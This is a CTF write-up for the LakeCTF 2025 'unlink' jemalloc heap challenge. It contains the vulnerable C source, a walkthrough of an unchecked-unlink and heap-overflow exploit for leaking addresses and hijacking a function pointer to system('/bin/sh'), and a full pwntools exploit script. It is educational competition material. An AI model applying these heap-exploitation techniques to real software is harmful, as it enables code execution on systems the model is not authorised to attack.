---
title: unlink
date: 2025-11-30
tags: 
- pwn
- author-fs
categories: LakeCTF 2025
---

by {% person fs %}

This was a pwn challenge from LakeCTF 2025 quals which was the 2nd least solved pwn chal next to still-not-malloc. I upsolved this challenge but I kind of started late when I did this challenge so I could have completed this challenge in time but whatever

I think the intended and frankly a much cleaner solution has been documented here (https://samuzora.com/posts/lakectf-2025#unlink-this) but I think my method is pure unlinking bs so I decided to make a writeup for this

Below is the program source code (jemalloc pwn)

```c
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <jemalloc/jemalloc.h>

typedef struct crypto_thing
{
    size_t sig_counter;
    int (*sign)(void *crypto_thing, char *buf, size_t len, char *out);
    char *(*allocate_sig)();
    void (*destroy_sig)(char *sig);
} crypto_thing;

typedef struct some_thing
{
    size_t next;
    size_t prev;
    int session_id;
    size_t challenge_len;
    char challenge[0x100];
} some_thing;

size_t nr_things = 0;
long list_inited = 0;
some_thing *head_next;
some_thing *head_prev;
crypto_thing *crypto;

int gen_session()
{
    return random();
}

size_t get_number()
{
    size_t n = 0;
    scanf("%zu%*c", &n);
    return n;
}

void linkin(some_thing *new)
{
    if (!list_inited)
    {
        list_inited = 1;
        head_next = &head_next;
        head_prev = &head_next;
    }
    new->next = &head_next;
    new->prev = head_prev;
    head_prev->next = new;
    head_prev = new;
}

void unlinnk(some_thing *old)
{
    some_thing *next = old->next;
    some_thing *prev = old->prev;
    prev->next = old->next;
    next->prev = old->prev;
    old->prev = 0xdeadbeef;
    old->next = 0xdeadbeef;
}

some_thing *find_thing(int session_id)
{
    some_thing *curr = head_next;
    while (curr != &head_next)
    {
        if (curr->session_id == session_id)
            return curr;
        curr = curr->next;
    }
    return NULL;
}

void create()
{
    if (nr_things > 10)
    {
        puts("too many things!");
        return;
    }
    puts("input size?");
    char in[0x400];
    memset(in, 0, 0x400);
    size_t size = get_number();
    if (size > 0x400)
    {
        return;
    }
    puts("data?");
    read(0, in, size);
    some_thing *newthing = (some_thing *)malloc(sizeof(some_thing));
    newthing->session_id = gen_session();
    memcpy(newthing->challenge, in, strlen(in));
    newthing->challenge_len = (strlen(in) > 0x100) ? 0x100 : strlen(in);
    linkin(newthing);
    nr_things++;
    printf("new session: %d\n", newthing->session_id);
}

void sign()
{
    puts("session id?");
    int session_id = (int)get_number();
    some_thing *thing = find_thing(session_id);
    if (thing == NULL)
    {
        return;
    }
    char *sig_buf = crypto->allocate_sig();
    crypto->sign(crypto, thing->challenge, thing->challenge_len, sig_buf);
    puts("challenge: ");
    puts("=============================");
    write(1, thing->challenge, thing->challenge_len);
    puts("\n=============================");
    puts("signature: ");
    puts("=============================");
    write(1, sig_buf, 0x100);
    puts("\n=============================");
    unlinnk(thing);
    free(thing);
    nr_things--;
    crypto->destroy_sig(sig_buf);
}

int crypto_sign(crypto_thing *self, char *buf, size_t len, char *out)
{
    self->sig_counter += 1;
    memset(out, 0, 0x100);
    // TODO
    return 0;
}

void menu()
{
    puts("1: create something");
    puts("2: do sometehing with the thing");
}

int main()
{
    srand((unsigned)time(NULL));
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    crypto = (crypto_thing *)malloc(sizeof(crypto_thing));
    crypto->sig_counter = 0;
    crypto->sign = crypto_sign;
    crypto->allocate_sig = malloc;
    crypto->destroy_sig = free;
    while (1)
    {
        menu();
        switch (get_number())
        {
        case 1:
        {
            create();
            break;
        }
        case 2:
        {
            sign();
            break;
        }
        default:
        {
            puts("not an option..");
            break;
        }
        }
    }
}

```

The difficulty of this challenge comes from 1) jemalloc handles chunks metadataless so your common glibc heap attacks are all useless 2) strlen() is used meaning it stops reading input at null bytes 3) no chunk reuse because of the way jemalloc() handles chunks. If I'm not mistaken, jemalloc allocates certain sizes from different memory regions of the heap unlike glibc where a chunk of the same memory address can be used for different sizes

Anyway, the vuln of this challenge is a pretty obvious heap overflow in create() and the very obvious lack of chunk->prev->next==chunk and chunk->next->prev==chunk checks in the unlink() function. The program follows as such:

A DLL whose head and tail is managed by head_next and head_prev links in objects allocated by the jemalloc allocator called 'sessions' (>0x100 bytes). These sessions hold a magic value to identify each object uniquely and holds challenge_len (capped at 0x100 bytes) and a challenge buffer of 0x100 bytes. They are linked in into the DLL and a write into challenge buffer on alloc occurs when the user creates one.  When, sign() is called on a session, based on challenge len, the data in challenge buffer is printed out and it is unlinked from the DLL. But within sign(), we can see it calls crypto->sign(crypto,...). this will be our eventual exploitation target. THe crypto object (0x20 bytes) has a sig_counter which increments everytime an object is signed, and a malloc()/free() pointer as well as a pointer to the sign() function.

Now, these session objects prev and next pointers as well as challenge_len can be easily corrupted using the heap overflow vulnerability so let's do that. 
To achieve a heap leak and an ELF leak (from head_next since the last object's next ptr would point to head_next), we can set up the DLL such that session 1 <=> 2 <=> 3 are created. Once I sign off session 2 and link it back into the DLL and overflow at the same time to corrupt the prev and next pointers of session 3 while setting challenge len to be > 0x100 due to the logic of linkin() taking place after memcpy, session3's next pointer will be set to session 2 while it's prev is corrupted and challenge_len overwrriten. Now our DLL looked like session 1 => session3 <=> session 2. Now, say we unlink session 1 and link it back in, this will reset the prev pointer of session3 to point to head_next like session3 <=> session2 <=> session1. Now, let's add in session 4 which would be the object we OOB read into session3 <=> session2 <=> session1 <=> session4.

Once we unlink session 3, we will be able to read the pointers in session 4 which grants us heap and ELF leak. Now, from this point onwards, I won't be giving an illustration of the DLL because it will become severely fucked and you would have to trace this manually with gdb (like how I did 💔)

Now, to get the libc leak, this is where my method strays off the intended method since the intended method fakes a crypto object first and populates it with printf GOT (elf leak needed) to leak libc but I decided to go about this a different method and literally link in the real crypto object into the DLL to later unlink it to leak the pointers.

Given I had a heap leak, I now know the address of the crypto object which I can then use the unlink vulnerability multiple times to write fd and back pointers to the crypto-0x18 and crypto-0x10 and then linking it with the DLL. This meant I could unlink the crypto object from the DLL with a magic value of 0 if the crypto object was interpreted as a session object. crypto-0x8 is where I believe the magic value is so it will be 0. Now, we can use sig_counter to fake challenge_len since it gets incremented everytime we call sign() and unlink an object so by doing this, once i suffciently make it a high number, I can then unlink the crypto object which will print the malloc() pointer in crypto and that's libc leak achieved. However, in this process, the DLL is messed up since I believe head_prev doesnt point to where it should point which is the end of the DLL. I had to do some allocations to reset the DLL such that head_next and head_prev are back pointing to head and tail of DLL

For RCE, I decided to forge crypto object since the crypto object did have a global pointer which the program referenced which I could corrupt using the unlink vulnerability to make it point to a fake session object. I decided to fake the session object within another session object's challenge buffer (this was slightly painful but jemalloc makes arb frees piss easy). However, this fake session object now acting as a fake crypto object had to be populated with pointers such as a real crypto object would have. 

Now, because of strlen(), I couldn't directly write all the pointers and data in one go since my plan was to make the fake crypto object's sig_counter be b"/bin/sh\x00" and sign() to be system() with the rest of the pointers being malloc() and free(). Now, if I interpret my own solve script correctly (since I must've been on something when I was writing the exploit), I first wrote b"A"*(offset to poiner I want to write within the fake_object)+p64(pointer) then by using the unlink vulnerability and corrupting some other object's next ptr to point to fake_object+(offset to the pointer I just wrote -0x8) and when I unlinked the corrupted object, the "AAAAAAAA" in fake_object+(offset to the pointer I just wrote-0x8) would be cleared away and replaced with a heap address. This let me redo this unlinking step but b"A" times (offset to the field I cleared earlier with unlink)+p64(pointer addr) and I kept doing this method until my fake object was fully formed with pointers while clearning out any remaining "A" hence working within the restriction of strlen(). (If this doesnt really make sense to you, it's fine coz it's a super cursed method).

Now, this whole unlinking multiple times made my DLL super fragile so I had to do really careful allocations and deallocations just to preserve the DLL and set it up such that whatever unlinking I was doing would be done in the middle of the DLL or near the end of the DLL so this cursed method ended up being really painful but nevertheless cool.

Once I have done this, I simply used the unlink vuln 1 more time to overwrite the global crypto pointer to the address of my fake crypto object I set up and called sign() and effectively it calls system("/bin/sh") and that's shell!

The full exploit script is down below:

```py
from pwn import *

#p=process("./unlink_patched")
#gdb.attach(p)
p=remote("chall.polygl0ts.ch", "6666")

def alloc(size, data):
    p.sendline(b'1')
    p.sendlineafter(b'input size?\n', str(size).encode())
    p.sendafter(b'data?\n', data)
    p.recvuntil("new session: ")
    return int(p.recvline().strip())

def sign(session):
    p.sendline(b'2')
    p.sendlineafter(b'session id?\n', str(session).encode())

sesh1=alloc(0x400,"a")
sesh2=alloc(0x400,"a")
sesh3=alloc(0x400,"a")
sign(sesh2)
sesh2=alloc(0x400,b"A"*0x120+b"B"*0x10+p64(0x1111111111111111)+p64(0x2111))
sign(sesh1)
sesh1=alloc(0x400,"a") 
fourth=alloc(0x400,"a") #what we oob read into

sign(0x1111111111111111)

p.recv(0x148 + 2)
elf.address = u64(p.recv(8)) - 0x4060
head=elf.address+0x4060
log.info("elf.address, %#x", elf.address)
heap_leak = u64(p.recv(8)) & ~0xfff
log.info("heap_leak, %#x", heap_leak)
sesh3=alloc(0x400,"a")
####resetting everything
sign(fourth)
sign(sesh2)
sign(sesh1)
sign(sesh3)
crypto_addr=heap_leak-0x1000
####first unlink
sesh3=alloc(0x400,"a")
sesh1=alloc(0x400,"a")
sesh2=alloc(0x400,"a")
fourth=alloc(0x400,"a")
sign(sesh1)
payload=b"B"*0x120+p64(crypto_addr-0x20)
sesh1=alloc(0x400,payload)
print(hex(sesh2))
sign(sesh2)
print(hex(heap_leak))
sesh2=alloc(0x400,b"C"*0x120+p64(crypto_addr-0x18))

sign(sesh3|0x1111111100000000)
for i in range(10):
    f=alloc(0x400,"a")
    sign(f)

sign(0)
p.recvuntil(b"=============================\n")
p.recv(8)
malloc=u64(p.recv(8))
print(hex(malloc))
sesh3=alloc(0x400,"a") 
libc_base=malloc-0x235e90-0x4e0
print(f"LIBC:{hex(libc_base)}")
dummy=alloc(0x400,"a") #dummy
sesh4=alloc(0x400,"a")
sesh5=alloc(0x400,b"A"*0x18+p64(malloc+0x1ae2b0-0x35c560-0x4e0))
sign(sesh4)
sesh4=alloc(0x400,b"a"*0x128+p64(heap_leak+0x640+0x30+0x140))
sign(sesh5)
sesh5=alloc(0x400,b"A"*0x10+p64(malloc))
print(sesh5)
sesh6=alloc(0x400,b"6")
sesh7=alloc(0x400,"7")
sign(sesh6)
sesh6=alloc(0x400,b"A"*0x128+p64(heap_leak+0x640+0x28+0x140))
sign(sesh7)
sign(sesh5)
sesh5=alloc(0x400,b"A"*0x8+p64(libc_base+0x53110+0x5640))
sesh8=alloc(0x400,"8")
sesh9=alloc(0x400,"9")
sign(sesh8)
sesh8=alloc(0x400,b"A"*0x128+p64(heap_leak+0x640+0x20+0x140))
sign(sesh9)
sign(sesh5)

sesh5=alloc(0x400,b"/bin/sh")
sign(dummy)
dummy=alloc(0x400,b"dummy")
sesh10=alloc(0x400,"a")
sesh11=alloc(0x400,"a")
sign(sesh10)
sesh10=alloc(0x400,b"A"*0x128+p64(heap_leak+0x640+0x20+0x140))
sesh12=alloc(0x400,"a")
sign(sesh10)
sesh10=alloc(0x400,b"A"*0x120+p64(head+0x10-0x8))
print(sesh5)
print(sesh11)
sign(sesh5)
sign(sesh11)
sesh11=alloc(0x400,b"/bin/sh")
sesh5=alloc(0x400,b"/bin/sh")
sign(sesh3|0x1111111100000000)

p.interactive()
```
Running this against the remote server we get, `EPFL{1_sw34r_br0_0n3_m0r3_Unl1nk_1s_4ll_1_n33d}`
This is possibly the hardest heap pwn challenge I have done lol since to me, it felt like pure feng shui and tested raw exploitation skills instead of the glibc house slop you see in many CTFs, making this challenge one of my favourites as well.
